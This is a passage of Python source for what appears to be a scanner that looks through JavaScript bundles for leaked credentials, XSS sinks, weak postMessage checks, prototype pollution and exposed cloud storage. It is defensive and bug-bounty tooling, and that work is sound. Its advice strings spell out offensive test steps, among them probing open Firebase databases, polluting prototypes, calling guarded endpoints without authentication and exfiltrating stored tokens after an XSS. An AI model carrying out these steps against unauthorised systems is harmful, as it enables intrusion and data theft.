         \[[^\]]*\]\s*\.\s*(?:includes|indexOf)\s*\(\s*[A-Za-z_$][\w$]*\s*\.\s*origin\s*\))""",
    re.VERBOSE)

#: Checks that look like validation but are bypassable with a hostname an
#: attacker can register.
_WEAK_ORIGIN_RES = [
    ("origin.indexOf(...) — matches anywhere in the string",
     re.compile(r"\.origin\s*\.\s*indexOf\s*\(")),
    ("origin.includes(...) — matches a substring, so evil-example.com passes",
     re.compile(r"\.origin\s*\.\s*includes\s*\(")),
    ("origin.startsWith(...) — example.evil.com passes",
     re.compile(r"\.origin\s*\.\s*startsWith\s*\(")),
    ("origin.endsWith(...) — notexample.com passes",
     re.compile(r"\.origin\s*\.\s*endsWith\s*\(")),
    ("origin.match(...) / unanchored regex",
     re.compile(r"\.origin\s*\.\s*(?:match|search)\s*\(")),
    ("regex tested against origin without ^ and $ anchors",
     re.compile(r"/[^/\n]{3,60}/\s*\.\s*test\s*\(\s*[A-Za-z_$][\w$]*\s*\.\s*origin")),
    ("message field trusted instead of event.origin",
     re.compile(r"\.data\s*\.\s*origin\b")),
]

_ORIGIN_MENTION_RE = re.compile(r"\.\s*origin\b")

#: How much of the handler body to inspect for an origin check.
HANDLER_WINDOW = 700


# ─────────────────────────────────────────────────────────────────────────────
#  Prototype pollution
# ─────────────────────────────────────────────────────────────────────────────

_PP_DIRECT_RE = re.compile(r"""(?:\[\s*['"`]__proto__['"`]\s*\]|\.__proto__\b|
                                 \[\s*['"`]constructor['"`]\s*\]\s*\[\s*['"`]prototype['"`]\s*\]|
                                 \bconstructor\s*\.\s*prototype\s*\[)""", re.VERBOSE)

_PP_MERGE_NAME_RE = re.compile(
    r"""\b(?:deepMerge|mergeDeep|deepExtend|extendDeep|deepAssign|deepClone|cloneDeep|
             defaultsDeep|setWith|zipObjectDeep|unflatten|objectPath|setValue|
             mergeWith|applyConfig)\b""", re.VERBOSE)

_PP_LOOP_RE = re.compile(r"for\s*\(\s*(?:var|let|const)?\s*([A-Za-z_$][\w$]*)\s+in\s+")

_PP_GUARD_RE = re.compile(
    r"""(?:__proto__|hasOwnProperty|Object\.create\s*\(\s*null|
         getOwnPropertyNames|prototype['"`]?\s*(?:===|!==|==|!=))""", re.VERBOSE)

#: Gadget property names worth grepping for once pollution is possible.
_PP_GADGETS = ("hitCallback", "event_callback", "cspNonce", "srcdoc",
               "trackingServerSecure", "sequence", "allowedTags", "ADD_ATTR")


# ─────────────────────────────────────────────────────────────────────────────
#  Inventory rules — aggregated, never one finding per occurrence
# ─────────────────────────────────────────────────────────────────────────────

ENDPOINT_RE = re.compile(r"""['"`](/(?!/)[A-Za-z0-9_\-./{}$:]{1,160})['"`]""")
TEMPLATE_ENDPOINT_RE = re.compile(r"`(/(?!/)[^`\n]{1,160})`")
FULLURL_RE = re.compile(r"https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]{4,}")

SENSITIVE_ENDPOINT_KW = (
    "/admin", "/administrator", "/internal", "/debug", "/actuator", "/manage",
    "/sudo", "/impersonate", "/masquerade", "/backup", "/migrate", "/export",
    "/graphiql", "/swagger", "/openapi", "/api-docs", "/metrics", "/console",
    "/wp-admin", "/phpmyadmin", "/.env", "/config", "/setup", "/install",
)

CLOUD_RE = re.compile(
    r"(?i)("
    r"[A-Za-z0-9.\-]+\.s3[.-][A-Za-z0-9.\-]*amazonaws\.com|"
    r"s3[.-][a-z0-9-]*\.amazonaws\.com/[A-Za-z0-9._\-]+|"
    r"storage\.googleapis\.com/[A-Za-z0-9._\-]+|[A-Za-z0-9._\-]+\.storage\.googleapis\.com|"
    r"[A-Za-z0-9.\-]+\.blob\.core\.windows\.net|[A-Za-z0-9.\-]+\.file\.core\.windows\.net|"
    r"[A-Za-z0-9.\-]+\.firebaseio\.com|[A-Za-z0-9.\-]+\.firebasedatabase\.app|"
    r"firebasestorage\.googleapis\.com/[A-Za-z0-9._\-/]+|"
    r"[A-Za-z0-9.\-]+\.digitaloceanspaces\.com|[A-Za-z0-9.\-]+\.r2\.dev"
    r")")

INTERNAL_IP_RE = re.compile(
    r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    r"|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}"
    r"|192\.168\.\d{1,3}\.\d{1,3}"
    r"|169\.254\.169\.254"
    r"|127\.0\.0\.1)\b")

INTERNAL_HOST_RE = re.compile(
    r"(?i)\b([a-z0-9][a-z0-9-]{0,62}\.(?:internal|local|corp|intranet|lan|test)"
    r"|(?:jenkins|jira|confluence|grafana|kibana|vault|consul|nexus|artifactory|"
    r"gitlab|sonar|rancher|argocd|prometheus|elastic)\.[a-z0-9.\-]+)\b")

EMAIL_RE = re.compile(r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b")

SOURCEMAP_RE = re.compile(r"//[#@]\s*sourceMappingURL=(\S+)")

STORAGE_WRITE_RE = re.compile(
    r"""(?:local|session)Storage\s*\.\s*setItem\s*\(\s*['"`]([^'"`]{1,60})['"`]""")
_SENSITIVE_STORAGE_KEY = re.compile(
    r"(?i)(token|jwt|auth|session|secret|password|credential|bearer|apikey|api_key|refresh)")

AUTHZ_RE = re.compile(
    r"""(?i)(?:
        \bisAdmin\b|\bis_admin\b|\bisStaff\b|\bisSuperuser\b|
        \brole\s*(?:===|==|!==|!=)\s*['"`][^'"`]{2,30}['"`]|
        \bhasPermission\s*\(|\bhasRole\s*\(|\bcheckPermission\s*\(|
        \bpermissions\s*\.\s*(?:includes|indexOf|some)\s*\(|
        \bscopes?\s*\.\s*includes\s*\(|
        \bcanActivate\b|\brequireAuth\b|\bbeforeEnter\b
    )""", re.VERBOSE)

FEATUREFLAG_RE = re.compile(
    r"""(?i)(?:launchdarkly|split\.io|optimizely|configcat|statsig|unleash|
              featureFlags?\s*[:=]|\bflags\s*[:=]\s*\{)""", re.VERBOSE)

GRAPHQL_OP_RE = re.compile(
    r"(?:\b(?:query|mutation|subscription)\s+([A-Za-z_][\w]*)\s*[({])")

WS_RE = re.compile(r"(wss?://[A-Za-z0-9._:/?#\[\]@!$&'()*+,;=%-]{4,})")

DEBUG_RE = re.compile(
    r"(?i)\b(?:debugger\b|isDebug\b|debugMode\b|__DEV__\b|devMode\b"
    r"|debug\s*[:=]\s*(?:true|1)\b|NODE_ENV\s*[:=]\s*['\"`]development)")

#: The lookbehind matters: without it the `//` in `https://host` is read as a
#: comment marker and the match swallows whatever real comment follows it.
_COMMENT_KEYWORDS = (r"TODO|FIXME|HACK|XXX|BYPASS|WORKAROUND|REMOVE\s+BEFORE|"
                     r"DISABLE[SD]?\s+AUTH|TEMPORARY|INSECURE|DO\s+NOT\s+SHIP")

#: Two forms, handled separately because they end differently. The lookbehind
#: on the line form stops the `//` in `https://host` being read as a comment
#: marker, and the block form is not allowed to run past its own `*/` — in a
#: one-line bundle either mistake swallows hundreds of characters of code and
#: reports it as the comment.
COMMENT_RE = re.compile(
    r"(?:"
    r"(?<![:/])//[^\n]{0,200}?\b(?:" + _COMMENT_KEYWORDS + r")\b[^\n]{0,80}"
    r"|"
    r"/\*(?:(?!\*/)[^\n]){0,200}?\b(?:" + _COMMENT_KEYWORDS + r")\b(?:(?!\*/)[^\n]){0,160}"
    r")")

#: Which keyword was responsible, for the finding title.
COMMENT_KEYWORD_RE = re.compile(r"(?i)\b(" + _COMMENT_KEYWORDS + r")\b")

WEAK_CRYPTO_RE = re.compile(
    r"(?i)(?:CryptoJS\s*\.\s*(MD5|SHA1|RC4|DES|TripleDES)\b"
    r"|\bcreateHash\s*\(\s*['\"`](md5|sha1)['\"`]"
    r"|\balgorithm\s*[:=]\s*['\"`](?:MD5|SHA-?1|DES|RC4)['\"`]"
    r"|\bMath\s*\.\s*random\s*\(\s*\)[^;\n]{0,40}(?:token|password|secret|key|nonce|otp))")

VERSION_RE = re.compile(
    r"""(?i)(?:/\*!?\s*|\b)(jquery|lodash|underscore|angular(?:js)?|react|vue|
         moment|axios|dompurify|bootstrap|handlebars|ember|backbone|d3|
         core-js|next|nuxt|svelte)
         [\s@/-]*v?(\d+\.\d+\.\d+)""", re.VERBOSE)

#: Libraries whose older releases carry well-known client-side CVEs. Used to
#: decide whether a detected version is worth calling out.
VULNERABLE_BELOW = {
    "jquery": ((3, 5, 0), "XSS via htmlPrefilter / $() HTML parsing; prototype pollution in $.extend below 3.4.0"),
    "lodash": ((4, 17, 21), "prototype pollution in merge/set/zipObjectDeep"),
    "angularjs": ((1, 8, 0), "sandbox escape and template injection"),
    "dompurify": ((3, 1, 3), "sanitiser bypasses — check the exact version against the changelog"),
    "moment": ((2, 29, 4), "ReDoS and path traversal"),
    "axios": ((1, 6, 0), "SSRF and CSRF-token leakage on cross-host redirect"),
    "handlebars": ((4, 7, 7), "prototype pollution leading to RCE in some setups"),
    "next": ((13, 5, 0), "several middleware and auth-bypass advisories"),
    "vue": ((3, 0, 0), "full-build template compilation is a JS-execution sink"),
    "bootstrap": ((4, 3, 1), "XSS in data-template / tooltip attributes"),
}


# ─────────────────────────────────────────────────────────────────────────────
#  The scanner
# ─────────────────────────────────────────────────────────────────────────────

class JsScanner:
    """Runs every rule over one file and returns deduplicated findings.

    One instance per file. The expensive per-file work — the line index, the
    module anchor table, the noise spans — is done once in the constructor and
    shared by every rule.
    """

    def __init__(self, url: str, content: str, source_map=None):
        self.url = url
        self.content = content
        self.index = LineIndex(content)
        self.anchors = _module_anchors(content)
        self.noise = noise_regions(content)
        self.map = source_map
        self._found = {}

        lines = content.count("\n") + 1
        self.avg_line = len(content) / max(1, lines)
        self.minified = self.avg_line > MINIFIED_AVG_LINE

    # ── emitting ──────────────────────────────────────────────────────────

    def at(self, start: int, end: int) -> Location:
        """Build a full location record for a span."""
        line, column = self.index.position(start)
        original = None
        if self.map is not None:
            try:
                original = self.map.original_position(line, column)
            except Exception:
                original = None
        return Location(
            file=self.url,
            line=line,
            column=column,
            offset=start,
            excerpt=excerpt(self.content, start, end),
            module=_module_for(self.anchors, start),
            original=original,
        )

    def add(self, severity, category, title, start, end, **kwargs):
        """Record one occurrence, merging it into an existing finding if the
        same thing has already been seen in this file."""
        evidence = kwargs.pop("evidence", "")
        finding = Finding(severity=severity, category=category, title=title,
                          evidence=evidence, **kwargs)
        existing = self._found.get(finding.key)
        if existing is None:
            self._found[finding.key] = finding
            existing = finding
        existing.count += 1
        if len(existing.locations) < MAX_LOCATIONS:
            existing.locations.append(self.at(start, end))
        # A later occurrence in first-party code outranks an earlier one in a
        # vendored module, so keep the severity at its highest observed value.
        if SEV_ORDER.get(severity, 0) > SEV_ORDER.get(existing.severity, 0):
            existing.severity = severity

    def results(self) -> list:
        return sorted(self._found.values(),
                      key=lambda f: (-SEV_ORDER.get(f.severity, 0), f.category, f.title))

    def _vendored_at(self, offset: int) -> bool:
        """True when the offset falls inside a third-party module."""
        module = _module_for(self.anchors, offset)
        if "node_modules" in module:
            return True
        if self.map is not None:
            line, column = self.index.position(offset)
            try:
                original = self.map.original_position(line, column)
            except Exception:
                return False
            if original and original.get("vendored"):
                return True
        return False

    # ── rules ─────────────────────────────────────────────────────────────

    def scan(self, agg=None) -> list:
        self.scan_secrets()
        self.scan_public_keys()
        self.scan_firebase_config()
        self.scan_generic_secrets()
        self.scan_jwts()
        self.scan_dom_xss()
        self.scan_postmessage()
        self.scan_prototype_pollution()
        self.scan_storage()
        self.scan_authz()
        self.scan_cloud()
        self.scan_internal_hosts()
        self.scan_sourcemaps()
        self.scan_debug()
        self.scan_comments()
        self.scan_crypto()
        self.scan_versions()
        self.scan_inventory(agg)
        return self.results()

    # ── secrets ───────────────────────────────────────────────────────────

    def scan_secrets(self):
        for name, rx, severity in FORBIDDEN_SECRETS:
            for m in rx.finditer(self.content):
                value = m.group(1) if m.groups() else m.group(0)
                if in_spans(self.noise, m.start()):
                    continue

                detail_bits = []
                confidence = "firm"

                if name.startswith("GitHub") or name.startswith("npm"):
                    ok = github_token_checksum_ok(value)
                    if ok is True:
                        detail_bits.append("embedded CRC32 checksum is valid — "
                                           "this is a real token, not a lookalike")
                        confidence = "confirmed"
                    elif ok is False:
                        detail_bits.append("embedded checksum does NOT validate — "
                                           "likely a placeholder or a redacted example")
                        confidence = "tentative"

                if name == "AWS access key ID":
                    account = aws_account_from_key(value)
                    if account:
                        detail_bits.append(f"encodes AWS account {account}")
                        confidence = "confirmed"
                    if re.search(r"(?i)aws.{0,60}secret.{0,20}['\"][A-Za-z0-9/+=]{40}['\"]",
                                 self.content):
                        detail_bits.append("a 40-character AWS secret access key "
                                           "appears nearby — the pair is complete")

                if self._vendored_at(m.start()):
                    detail_bits.append("inside a third-party module — likely a "
                                       "library's own test fixture, verify before reporting")
                    confidence = "tentative"

                self.add(severity if confidence != "tentative" else "MEDIUM",
                         "Exposed Credential", name,
                         m.start(), m.end(),
                         evidence=_redact(value),
                         detail="; ".join(detail_bits),
                         confidence=confidence,
                         cwe="CWE-798",
                         rec="Rotate the credential, then remove it from the client "
                             "bundle and move the call server-side.")

    def scan_public_keys(self):
        for name, rx, note in PUBLIC_BY_DESIGN:
            for m in rx.finditer(self.content):
                if in_spans(self.noise, m.start()):
                    continue
                value = m.group(1) if m.groups() else m.group(0)
                self.add("INFO", "Client Configuration Key", name,
                         m.start(), m.end(),
                         evidence=_redact(value, keep=10),
                         detail=note,
                         confidence="firm",
                         rec="Not a leak on its own. Check the restriction or scope "
                             "behind it — see the guidance for this category.")

    #: A Firebase web config is a cluster of individually harmless values. It
    #: is worth detecting as a group because it names the project, and the
    #: project is what you go and test — the apiKey itself is never the issue.
    _FIREBASE_KEYS = ("apiKey", "authDomain", "projectId", "storageBucket",
                      "messagingSenderId", "appId", "databaseURL")

    def scan_firebase_config(self):
        for m in re.finditer(r"authDomain\s*:\s*['\"`]([A-Za-z0-9.\-]+)\.firebaseapp\.com",
                             self.content):
            window = self.content[max(0, m.start() - 400):m.start() + 400]
            present = [k for k in self._FIREBASE_KEYS if k in window]
            if len(present) < 3:
                continue
            project = m.group(1)
            db = re.search(r"databaseURL\s*:\s*['\"`]([^'\"`]+)", window)
            self.add("MEDIUM", "Client Configuration Key",
                     f"Firebase web config for project '{project}'",
                     m.start(), m.end(),
                     evidence=f"{project} ({', '.join(present)})",
                     detail=("The config is meant to be public — the security lives "
                             "entirely in the Firebase Security Rules, which this "
                             "cannot see. Go and test them."
                             + (f" Database: {db.group(1)}" if db else "")),
                     confidence="firm",
                     cwe="CWE-284",
                     rec=f"curl https://{project}.firebaseio.com/.json and "
                         f"https://{project}-default-rtdb.firebaseio.com/.json for open "
                         "read; try a PATCH for open write; list the storage bucket; and "
                         "test whether self-signup is open via identitytoolkit "
                         "accounts:signUp with the apiKey — that last one is the usual "
                         "way in, because everything gated on 'request.auth != null' "
                         "then becomes reachable.")

    def scan_generic_secrets(self):
        for m in GENERIC_SECRET_RE.finditer(self.content):
            label, value = m.group(1), m.group(2)
            if in_spans(self.noise, m.start()):
                continue
            if _NOT_A_SECRET_NAME.search(m.group(0)):
                continue
            if looks_like_noise(value):
                continue
            if value.lower().startswith(("http", "/", "./", "../", "data:")):
                continue
            # A value that is itself a template placeholder is configuration,
            # not a secret: ${API_KEY}, {{token}}, <your-key-here>.
            if re.search(r"[${}<>]", value):
                continue

            entropy = shannon_entropy(value)
            hexish = bool(re.fullmatch(r"[0-9a-fA-F]+", value))
            floor = GENERIC_ENTROPY_HEX if hexish else GENERIC_ENTROPY_BASE64
            if entropy < floor:
                continue

            severity = "HIGH" if re.search(r"(?i)password|secret|private", label) else "MEDIUM"
            self.add(severity, "Exposed Credential",
                     f"High-entropy value assigned to '{label}'",
                     m.start(), m.end(),
                     evidence=_redact(value),
                     detail=f"Shannon entropy {entropy:.2f} over {len(value)} characters. "
                            "Pattern-matched on the identifier, so confirm what it "
                            "authenticates before reporting.",
                     confidence="tentative",
                     cwe="CWE-798",
                     rec="Identify the service, test the value against it, and only "
                         "report once you can show it authenticates.")

    def scan_jwts(self):
        rx = re.compile(r"\b(ey[A-Za-z0-9_-]{10,}\.ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,512})")
        for m in rx.finditer(self.content):
            token = m.group(1)
            decoded = decode_jwt(token)
            if not decoded:
                continue
            payload = decoded["payload"]
            header = decoded["header"]

            interesting = []
            role = str(payload.get("role", ""))
            if role:
                interesting.append(f"role={role}")
            for claim in ("sub", "email", "user_id", "userId", "scope", "scp",
                          "aud", "iss", "tenant", "org"):
                if claim in payload:
                    interesting.append(f"{claim}={str(payload[claim])[:60]}")

            severity = "MEDIUM"
            title = "Hardcoded JWT"
            rec = ("Decode it, check whether it is still valid, and establish what "
                   "it grants. Report the claims it discloses even if expired.")

            if role in ("service_role", "admin", "superuser", "root"):
                severity = "CRITICAL"
                title = f"Hardcoded JWT with {role} privileges"
                rec = ("A service_role / admin token in client code bypasses "
                       "row-level security and per-user authorisation entirely. "
                       "Confirm with a single read of a protected resource, then "
                       "report immediately — this is normally a P1.")
            elif str(header.get("alg", "")).lower() == "none":
                severity = "HIGH"
                title = "Hardcoded JWT signed with alg=none"

            self.add(severity, "Exposed Credential", title,
                     m.start(), m.end(),
                     evidence=_redact(token, keep=12),
                     detail=(f"alg={header.get('alg', '?')}"
                             + (f", exp={payload.get('exp')}" if payload.get("exp") else "")
                             + (("; claims: " + ", ".join(interesting[:6])) if interesting else "")),
                     confidence="confirmed",
                     cwe="CWE-798",
                     rec=rec)

    # ── DOM XSS ───────────────────────────────────────────────────────────

    def scan_dom_xss(self):
        """Report sinks by whether a taint source is reachable from them.

        Three outcomes, kept deliberately distinct: a sink with a source beside
        it (worth testing now), a sink whose argument is a bare variable (worth
        triaging), and a sink fed only by literals (not reported at all).
        """
        groups = (
            ("executes script directly", EXEC_SINKS, "HIGH"),
            ("parses HTML", HTML_SINKS, "HIGH"),
            ("navigates", NAV_SINKS, "MEDIUM"),
        )
        for kind, sinks, base_sev in groups:
            for name, rx in sinks:
                for m in rx.finditer(self.content):
                    if in_spans(self.noise, m.start()):
                        continue
                    source = _nearest_source(self.content, m.start())
                    vendored = self._vendored_at(m.start())

                    if source:
                        severity = "HIGH" if kind != "navigates" else "MEDIUM"
                        if kind == "executes script directly":
                            severity = "HIGH"
                        if vendored:
                            severity = "MEDIUM"
                        self.add(
                            severity, "DOM XSS — source reaches sink",
                            f"{source} → {name}",
                            m.start(), m.end(),
                            evidence=f"{name} ({kind})",
                            detail=(f"'{source}' appears within {TAINT_WINDOW} characters "
                                    f"of this sink"
                                    + (" — inside a third-party module" if vendored else "")),
                            confidence="firm",
                            cwe="CWE-79",
                            rec="Trace the value in DevTools from the source to the sink, "
                                "then build a URL that reaches it. Proof is "
                                "alert(document.domain) from a crafted URL, screenshotted.")
                    elif not vendored:
                        self.add(
                            "LOW", "DOM sink — needs manual triage", name,
                            m.start(), m.end(),
                            evidence=f"{name} ({kind})",
                            detail="No taint source found near this sink. It is only a "
                                   "vulnerability if attacker-controlled data reaches it.",
                            confidence="tentative",
                            cwe="CWE-79",
                            rec="Set a breakpoint on the sink and check what actually "
                                "arrives. Do not report without a proven source.")

        # setTimeout / setInterval, but only with a string-shaped first argument
        for m in _TIMER_RE.finditer(self.content):
            arg = (m.group(1) or "").strip()
            if not arg or arg.startswith(("function", "(", "()", "async")):
                continue
            string_arg = arg.startswith(("'", '"', "`"))
            source = _nearest_source(self.content, m.start())
            if not (string_arg or source):
                continue
            self.add("HIGH" if source else "LOW",
                     "DOM XSS — source reaches sink" if source
                     else "DOM sink — needs manual triage",
                     f"{'setTimeout/setInterval with a string argument'}"
                     + (f" ← {source}" if source else ""),
                     m.start(), m.end(),
                     evidence=arg[:60],
                     detail="A string first argument to a timer is evaluated as code. "
                            "A function reference is safe and is not reported.",
                     confidence="firm" if source else "tentative",
                     cwe="CWE-79",
                     rec="Confirm the string is attacker-influenced, then inject an "
                         "expression and show it executing.")

    # ── postMessage ───────────────────────────────────────────────────────

    def scan_postmessage(self):
        for m in _LISTENER_RE.finditer(self.content):
            body = self.content[m.start():m.start() + HANDLER_WINDOW]

            weak = [label for label, rx in _WEAK_ORIGIN_RES if rx.search(body)]
            strict = bool(_STRICT_ORIGIN_RE.search(body))
            mentions_origin = bool(_ORIGIN_MENTION_RE.search(body))

            reaches_sink = any(
                rx.search(body)
                for _n, rx in (HTML_SINKS + EXEC_SINKS + NAV_SINKS))
            stores = bool(STORAGE_WRITE_RE.search(body)) or "document.cookie" in body

            if weak:
                self.add("HIGH", "postMessage — weak origin validation",
                         weak[0],
                         m.start(), m.end(),
                         evidence="message listener",
                         detail=("The check can be satisfied by a hostname an attacker "
                                 "can register (for example example.com.attacker.com "
                                 "or attacker-example.com)."
                                 + (" The handler reaches a DOM sink." if reaches_sink else "")),
                         confidence="firm",
                         cwe="CWE-346",
                         rec="Host a page that frames the target and post a message from "
                             "a lookalike origin; show the handler acting on it.")
            elif not mentions_origin:
                severity = "HIGH" if reaches_sink else ("MEDIUM" if stores else "LOW")
                self.add(severity, "postMessage — no origin validation",
                         "message listener does not check event.origin",
                         m.start(), m.end(),
                         evidence="message listener",
                         detail=("Any page that can obtain a handle to this window can "
                                 "send it messages."
                                 + (" The handler reaches a DOM sink — this is a direct "
                                    "XSS path." if reaches_sink else "")
                                 + (" The handler writes to storage or cookies." if stores else "")),
                         confidence="firm",
                         cwe="CWE-346",
                         rec="From an attacker page: frame the target and postMessage a "
                             "hostile payload; screenshot the result.")
            else:
                self.add("INFO", "postMessage — origin checked",
                         "message listener validates event.origin",
                         m.start(), m.end(),
                         evidence="message listener",
                         detail="Read the comparison yourself — a strict-looking check "
                                "can still be wrong.",
                         confidence="firm")

        for m in re.finditer(r"\.postMessage\s*\(([^)]{0,200}?),\s*['\"`]\*['\"`]\s*\)",
                             self.content):
            payload = m.group(1)
            sensitive = re.search(r"(?i)token|jwt|auth|session|email|user|password|apikey", payload)
            self.add("MEDIUM" if sensitive else "LOW",
                     "postMessage — sent to wildcard origin",
                     "postMessage(..., '*')",
                     m.start(), m.end(),
                     evidence=payload.strip()[:80],
                     detail=("The payload references credential-like fields, so any page "
                             "holding a window handle receives them."
                             if sensitive else
                             "Any page holding a window handle receives this message."),
                     confidence="firm",
                     cwe="CWE-346",
                     rec="Frame or open the page from an attacker origin, listen for "
                         "messages, and capture what arrives.")

    # ── prototype pollution ───────────────────────────────────────────────

    def scan_prototype_pollution(self):
        for m in _PP_DIRECT_RE.finditer(self.content):
            if in_spans(self.noise, m.start()):
                continue
            window = self.content[max(0, m.start() - 160):m.start() + 160]
            guarded = bool(_PP_GUARD_RE.search(window.replace(m.group(0), "")))
            self.add("MEDIUM" if not guarded else "INFO",
                     "Prototype pollution surface",
                     "__proto__ / constructor.prototype accessed by computed key",
                     m.start(), m.end(),
                     evidence=m.group(0),
                     detail=("A guard appears nearby, so this may be a defence rather "
                             "than a sink." if guarded else
                             "No __proto__ guard or hasOwnProperty check nearby."),
                     confidence="tentative",
                     cwe="CWE-1321",
                     rec="Test with ?__proto__[testpp]=polluted and "
                         "?constructor[prototype][testpp]=polluted, then read "
                         "Object.prototype.testpp in the console.")

        for m in _PP_MERGE_NAME_RE.finditer(self.content):
            if self._vendored_at(m.start()):
                continue
            self.add("LOW", "Prototype pollution surface",
                     f"deep merge/clone helper: {m.group(0)}",
                     m.start(), m.end(),
                     evidence=m.group(0),
                     detail="Recursive merge functions are the classic pollution sink "
                            "when they copy keys from parsed user input.",
                     confidence="tentative",
                     cwe="CWE-1321",
                     rec="Find what feeds it. If a URL parameter or postMessage payload "
                         "is merged, test for pollution and then look for a gadget.")

        gadgets = [g for g in _PP_GADGETS if g in self.content]
        if gadgets:
            first = self.content.find(gadgets[0])
            self.add("INFO", "Prototype pollution surface",
                     "known gadget property present in the bundle",
                     first, first + len(gadgets[0]),
                     evidence=", ".join(gadgets[:6]),
                     detail="These property names are documented pollution gadgets — "
                            "if pollution is possible, they turn it into script execution.",
                     confidence="tentative",
                     cwe="CWE-1321",
                     rec="Only relevant once pollution is proven. Then pollute the "
                         "gadget property and re-trigger the code path.")

    # ── the rest ──────────────────────────────────────────────────────────

    def scan_storage(self):
        for m in STORAGE_WRITE_RE.finditer(self.content):
            key = m.group(1)
            if not _SENSITIVE_STORAGE_KEY.search(key):
                continue
            self.add("MEDIUM", "Session material in browser storage",
                     f"writes '{key}' to web storage",
                     m.start(), m.end(),
                     evidence=key,
                     detail="Web storage is readable by any script on the origin, so "
                            "any XSS becomes account takeover. A cookie with HttpOnly "
                            "is not.",
                     confidence="firm",
                     cwe="CWE-522",
                     rec="If you land an XSS anywhere on the origin, exfiltrate this "
                         "key to show the impact. Otherwise report it as the reason an "
                         "XSS here would be critical rather than moderate.")

    def scan_authz(self):
        seen = 0
        for m in AUTHZ_RE.finditer(self.content):
            if self._vendored_at(m.start()):
                continue
            seen += 1
            if seen > 60:
                break
            self.add("MEDIUM", "Client-side authorisation check",
                     m.group(0).strip()[:70],
                     m.start(), m.end(),
                     evidence=m.group(0).strip()[:70],
                     detail="Every one of these is a claim about a server-side check "
                            "that may not exist.",
                     confidence="firm",
                     cwe="CWE-602",
                     rec="Call the endpoint this guards directly, as a low-privilege "
                         "user and unauthenticated. If the server returns the data, "
                         "that is a broken access control finding — the JavaScript was "
                         "the only thing stopping you.")

    def scan_cloud(self):
        for m in CLOUD_RE.finditer(self.content):
            self.add("MEDIUM", "Cloud storage reference", m.group(1),
                     m.start(), m.end(),
                     evidence=m.group(1),
                     confidence="firm",
                     cwe="CWE-200",
                     rec="Test anonymous read and list, then an anonymous write of a "
                         "harmless object. Also check whether the bucket name is "
                         "unclaimed, which is a takeover.")

    def scan_internal_hosts(self):
        for m in INTERNAL_IP_RE.finditer(self.content):
            value = m.group(0)
            severity = "MEDIUM" if value == "169.254.169.254" else "LOW"
            detail = ("The cloud instance metadata address — its presence in client "
                      "code usually means a server-side fetch takes a URL from somewhere."
                      if value == "169.254.169.254" else
                      "Useful for network mapping and as an SSRF target list.")
            self.add(severity, "Internal host disclosure", value,
                     m.start(), m.end(), evidence=value, detail=detail,
                     confidence="firm", cwe="CWE-200",
                     rec="Feed these to any SSRF candidate you find, and note them in "
                         "the report as internal architecture disclosure.")
        for m in INTERNAL_HOST_RE.finditer(self.content):
            self.add("LOW", "Internal host disclosure", m.group(1),
                     m.start(), m.end(), evidence=m.group(1),
                     detail="An internal-looking hostname referenced from public code.",
                     confidence="firm", cwe="CWE-200",
                     rec="Check whether it resolves publicly and whether it is in scope.")

    def scan_sourcemaps(self):
        for m in SOURCEMAP_RE.finditer(self.content):
            ref = m.group(1)
            self.add("MEDIUM", "Source map reference", ref,
                     m.start(), m.end(),
                     evidence=ref,
                     detail="Fetched separately — see the status recorded against this "
                            "finding by the crawler.",
                     confidence="firm",
                     cwe="CWE-540",
                     rec="Fetch the .map. If it returns 200 with sourcesContent, you "
                         "have the original source: read it for admin routes, comments, "
                         "inlined environment variables and the permission model.")

    def scan_debug(self):
        for m in DEBUG_RE.finditer(self.content):
            if self._vendored_at(m.start()):
                continue
            self.add("LOW", "Debug or development artefact", m.group(0).strip()[:60],
                     m.start(), m.end(), evidence=m.group(0).strip()[:60],
                     confidence="firm",
                     rec="Try to turn the mode on (query parameter, localStorage flag, "
                         "global variable) and see what extra output or functionality "
                         "appears.")

    def scan_comments(self):
        for m in COMMENT_RE.finditer(self.content):
            text = m.group(0).strip()
            keyword = COMMENT_KEYWORD_RE.search(text)
            self.add("LOW", "Revealing comment",
                     keyword.group(1).upper() if keyword else "comment",
                     m.start(), m.end(),
                     evidence=text[:180],
                     confidence="firm",
                     rec="Read it for endpoints, credentials, bypasses or known-broken "
                         "behaviour, then test whatever it points at.")

    def scan_crypto(self):
        for m in WEAK_CRYPTO_RE.finditer(self.content):
            if self._vendored_at(m.start()):
                continue
            algo = m.group(0).strip()[:60]
            predictable = "random" in algo.lower()
            self.add("MEDIUM" if predictable else "LOW", "Weak cryptography", algo,
                     m.start(), m.end(), evidence=algo,
                     detail=("Math.random() is not cryptographically secure — a value "
                             "derived from it is predictable."
                             if predictable else
                             "Only a weakness where it is used for a security purpose: "
                             "hashing passwords, signing tokens, integrity checks."),
                     confidence="tentative",
                     cwe="CWE-327",
                     rec="Establish what the output is used for. A predictable token or "
                         "a forgeable signature is the finding; a checksum is not.")

    def scan_versions(self):
        for m in VERSION_RE.finditer(self.content):
            library = m.group(1).lower()
            version = m.group(2)
            floor = VULNERABLE_BELOW.get(library)
            if not floor:
                continue
            bound, note = floor
            try:
                parts = tuple(int(p) for p in version.split("."))
            except ValueError:
                continue
            if parts >= bound:
                continue
            self.add("MEDIUM", "Outdated library with known issues",
                     f"{library} {version}",
                     m.start(), m.end(),
                     evidence=f"{library} {version}",
                     detail=f"Below {'.'.join(str(p) for p in bound)} — {note}.",
                     confidence="firm",
                     cwe="CWE-1104",
                     rec="Confirm the version at runtime (for example jQuery.fn.jquery), "
                         "then look up the advisories for that exact release and test "
                         "the ones that apply to how the app uses it.")

    # ── inventory (aggregated across the whole run) ────────────────────────

    def scan_inventory(self, agg):
        if agg is None:
            return

        for m in ENDPOINT_RE.finditer(self.content):
            path = m.group(1)
            if len(path) < 3 or path.startswith("//"):
                continue
            if re.fullmatch(r"/[\d.]+", path):
                continue
            agg.setdefault("endpoints", set()).add(path)
            lowered = path.lower()
            if any(k in lowered for k in SENSITIVE_ENDPOINT_KW):
                agg.setdefault("sensitive_endpoints", set()).add(path)
                self.add("MEDIUM", "Sensitive endpoint referenced", path,
                         m.start(), m.end(), evidence=path,
                         detail="Named in client code, which does not mean it is "
                                "protected server-side.",
                         confidence="firm", cwe="CWE-284",
                         rec="Request it unauthenticated, then as a low-privilege user, "
